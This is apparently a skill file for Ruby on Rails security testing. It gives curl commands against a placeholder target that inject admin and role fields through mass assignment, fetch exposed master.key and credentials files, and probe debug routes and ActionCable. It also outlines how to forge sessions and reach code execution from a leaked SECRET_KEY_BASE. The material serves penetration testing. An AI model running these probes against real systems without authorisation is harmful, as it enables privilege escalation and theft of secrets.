---
name: rails
description: Ruby on Rails security testing covering mass assignment, strong params bypass, deserialization, secret_key_base exploitation, and ActionCable
---

# Ruby on Rails Security Testing

## Key Vulnerabilities

### Mass Assignment

```bash
# Add admin fields to registration/update requests
curl -sk "https://TARGET/users" -X POST -H "Content-Type: application/json" \
  -d '{"user":{"email":"test@test.com","password":"test","admin":true,"role":"admin"}}'
curl -sk "https://TARGET/api/profile" -X PATCH -H "Content-Type: application/json" \
  -d '{"user":{"is_admin":true,"role_id":1}}'
```

### Secret Key Base Exploitation

```bash
# If SECRET_KEY_BASE is leaked (via .env, error pages, git history)
# → Forge session cookies, CSRF tokens, encrypted credentials
# Check for exposed Rails credentials
curl -sk "https://TARGET/config/credentials.yml.enc"
curl -sk "https://TARGET/config/master.key"
```

### Deserialization (Marshal/YAML)

```bash
# Rails uses Marshal for session cookies (cookie store)
# If SECRET_KEY_BASE known → forge malicious serialized session → RCE
# Check cookie format: _session_id=BASE64_COOKIE--HMAC
```

### Debug Mode / Error Pages

```bash
curl -sk "https://TARGET/rails/info/properties" | head -20
curl -sk "https://TARGET/rails/info/routes" | head -50
# Routes file reveals ALL endpoints
```

### ActionCable WebSocket

```bash
# Rails WebSocket — test auth bypass
curl -sk "https://TARGET/cable" -H "Upgrade: websocket" -H "Connection: Upgrade"
```

## Pro Tips

1. `rails/info/routes` reveals ALL application routes when debug mode is on
2. Mass assignment via `admin`, `role`, `is_admin` fields is extremely common in Rails apps
3. If `SECRET_KEY_BASE` is found, you can forge sessions and achieve RCE via deserialization
4. Rails 7+ uses encrypted credentials — look for `master.key` exposure
5. Check `Gemfile.lock` for vulnerable gem versions
